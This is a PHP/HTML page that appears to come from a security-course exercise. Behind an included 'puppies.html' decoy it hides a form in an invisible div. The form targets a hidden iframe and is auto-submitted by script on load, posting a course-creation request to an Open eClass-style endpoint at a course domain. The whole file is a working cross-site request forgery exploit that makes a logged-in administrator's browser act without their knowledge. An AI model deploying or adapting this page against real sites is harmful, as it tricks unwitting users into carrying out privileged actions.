<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	 <?php 
	 include("puppies.html");
	 ?>
<html>


<head>
</head>

<body>

  <!-- <iframe style="display:none" name="csrf-frame"></iframe> -->
  <iframe style="display:none" name="csrf-frame"></iframe>
  <form method='post' name='createform' id="csrf-form" target="csrf-frame"  action= 'http://illegalskillsexception.csec.chatzi.org/modules/create_course/create_course.php' onsubmit="return checkrequired(this, 'intitule', 'titulaires');">
    <div style="display: none;">
    <input type="hidden" name="intitule" value="lola2" />
    <input type="hidden" name="faculte" value="1" />
    <input type="hidden" name="titulaires" value="Διαχειριστής Πλατφόρμας" />
    <input type="hidden" name="type" value="pre" />
    <input type="hidden" name="languageCourse" value="el" />
    <input type="hidden" name="description" value=""/>
    <input type="hidden" name="course_addon" value="" />
    <input type="hidden" name="course_keywords" value="" />
    <input type="hidden" name="visit" value="true" />
 <table width="99%" align='left' class='FormData'>
 <tbody>
<tr>
<th width="220">&nbsp;</th>
<td colspan='2'><b>Υποσυστήματα και τύπος πρόσβασης</b></td>
</tr>
<tr>
<th class='left' width="160" rowspan='2'>Τύπος Πρόσβασης:<br /></th>
<td colspan='2'><br />Διαθέσιμοι τύποι πρόσβασης</td>
</tr>
<tr>
<td colspan='2'>
<table>
<tr>
<td width='30'><img src="../../template/classic/img/OpenCourse.gif" title="Ανοικτό Μάθημα" width="16" height="16"></td>
<td width='200'>Ανοικτό Μάθημα</td>
<td width='5' ><input name="formvisible" type="radio" value="2" checked="checked" /></td>
<td width='325'><p align='right'><small>Ελεύθερη Πρόσβαση (χωρίς εγγραφή) από τη αρχική σελίδα χωρίς συνθηματικό</small></p></td>
</tr>
<tr>
<td width='30'><img src="../../template/classic/img/Registration.gif" title="Απαιτείται εγγραφή" width="16" height="16"></td>
<td width='200'>Απαιτείται εγγραφή</td>
<td width='5'><input name="formvisible" type="radio" value="1" /></td>
<td width='325'><p align='right'><small>Ελεύθερη Πρόσβαση (με εγγραφή) σε όσους διαθέτουν λογαριασμό στην πλατφόρμα</small></p></td></tr>
<tr>
<td colspan='4' class='right'><input type='checkbox' name='checkpassword' >&nbsp;Προαιρετικό συνθηματικό:
<input type='text' name='password' value='' class='FormData_InputText'>
</td>
</tr>
<tr>
<td width='30'><img src="../../template/classic/img/ClosedCourse.gif" title="Κλειστό μάθημα" width="16" height="16"></td>
<td width='200'>Κλειστό μάθημα</td>
<td width='5'><input name="formvisible" type="radio" value="0" /></td>
<td width='325'><p align='right'><small>Πρόσβαση στο μάθημα (για εγγραφή) έχουν μόνο όσοι βρίσκονται στη Λίστα Χρηστών του μαθήματος</small></p></td>
</tr>
</table>
<br />
</td>
</tr>
<tr>
<th class='left' rowspan='2'>Υποσυστήματα:</th>
<td colspan='2'><br />Επιλέξτε τα υποσυστήματα που θέλετε να ενεργοποιήσετε για το νέο σας μάθημα:</td>
</tr>
<td colspan='2'>
<table>
<tr>
<td width='30' ><img src="../../template/classic/img/calendar_on.gif" alt="" height="16" width="16"></td>
<td width='200'>Ατζέντα</td>
<td width='30' ><input name="subsystems[]" type="checkbox" value="1" /></td>
<th width='2' >&nbsp;</th>
<td width='30' >&nbsp;<img src="../../template/classic/img/dropbox_on.gif" alt="" height="16" width="16"></td>
<td width='200'>Ανταλλαγή Αρχείων</td>
<td width='30' ><input type="checkbox" name="subsystems[]" value="15" checked="checked"/></td>
</tr>
<tr>
<td><img src="../../template/classic/img/links_on.gif" alt="" height="16" width="16"></td>
<td>Σύνδεσμοι</td>
<td><input name="subsystems[]" type="checkbox" value="2"  /></td>
<th>&nbsp;</th>
<td>&nbsp;<img src="../../template/classic/img/groups_on.gif" alt="" height="16" width="16"></td>
<td>Ομάδες Χρηστών</td>
<td><input type="checkbox" name="subsystems[]" value="16" /></td>
</tr>
<tr>
<td><img src="../../template/classic/img/docs_on.gif" alt="" height="16" width="16"></td>
<td>Έγγραφα</td>
<td><input name="subsystems[]" type="checkbox" value="3" /></td>
<th>&nbsp;</th>
<td>&nbsp;<img src="../../template/classic/img/chat_on.gif" alt="" height="16" width="16"></td>
<td>Τηλεσυνεργασία</td>
<td><input type="checkbox" name="subsystems[]" value="19" checked="checked"/></td>
</tr>
<tr>
<td><img src="../../template/classic/img/video_on.gif" alt="" height="16" width="16"></td>
<td>Βίντεο</td>
<td><input name="subsystems[]" type="checkbox" value="4"  /></td>
<th>&nbsp;</th>
<td>&nbsp;<img src="../../template/classic/img/description_on.gif" alt="" height="16" width="16"></td>
<td>Περιγραφή Μαθήματος</td>
<td><input type="checkbox" name="subsystems[]" value="20"  />
</td>
</tr>
<tr>
<td><img src="../../template/classic/img/assignments_on.gif" alt="" height="16" width="16"></td>
<td>Εργασίες</td>
<td><input type="checkbox" name="subsystems[]" value="5" checked="checked"/></td>
<th>&nbsp;</th>
<td>&nbsp;<img src="../../template/classic/img/questionnaire_on.gif" alt="" height="16" width="16"></td>
<td>Ερωτηματολόγια</td>
<td><input type="checkbox" name="subsystems[]" value="21" /></td>
</tr>
<tr>
<td><img src="../../template/classic/img/announcements_on.gif" alt="" height="16" width="16"></td>
<td>Ανακοινώσεις</td>
<td><input type="checkbox" name="subsystems[]" value="7" /></td>
<th>&nbsp;</th>
<td>&nbsp;<img src="../../template/classic/img/lp_on.gif" alt="" height="16" width="16"></td>
<td>Γραμμή Μάθησης</td>
<td><input type="checkbox" name="subsystems[]"  value="23" /></td>
</tr>
<tr>
<td><img src="../../template/classic/img/forum_on.gif" alt="" height="16" width="16"></td>
<td>Περιοχές Συζητήσεων</td>
<td><input type="checkbox" name="subsystems[]" value="9" checked="checked"/></td>
<th>&nbsp;</th>
<td>&nbsp;<img src="../../template/classic/img/wiki_on.gif" alt="" height="16" width="16"></td>
<td>Σύστημα Wiki</td>
<td><input type="checkbox" name="subsystems[]" value="26" /></td>
</tr>
<tr>
<td><img src="../../template/classic/img/exercise_on.gif" alt="" height="16" width="16"></td>
<td>Ασκήσεις</td>
<td><input type="checkbox" name="subsystems[]" value="10" /></td>
<th>&nbsp;</th>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
	</table>
  <br />
	</td>
	</tr>
	<tr>
	<th>&nbsp;</th>
	<td width='400'>
	<input type='text' name='create_course'   value="Δημιουργία μαθήματος!"></td>
	<td><p align='right'><small>Σημ. μπορείτε να αλλάξετε οποιεσδήποτε από τις πληροφορίες αργότερα</small></p></td>
	</tr>
	</tbody>
	</table><br />
</div>
</form>


<script>document.getElementById("csrf-form").submit()</script>

<!-- <script> document.getElementById('frm1').submit();
// window.onload = function(){
//     var button = document.getElementById('frm1');
//     button.form.submit();
// }
</script> -->

      </body>
</html>
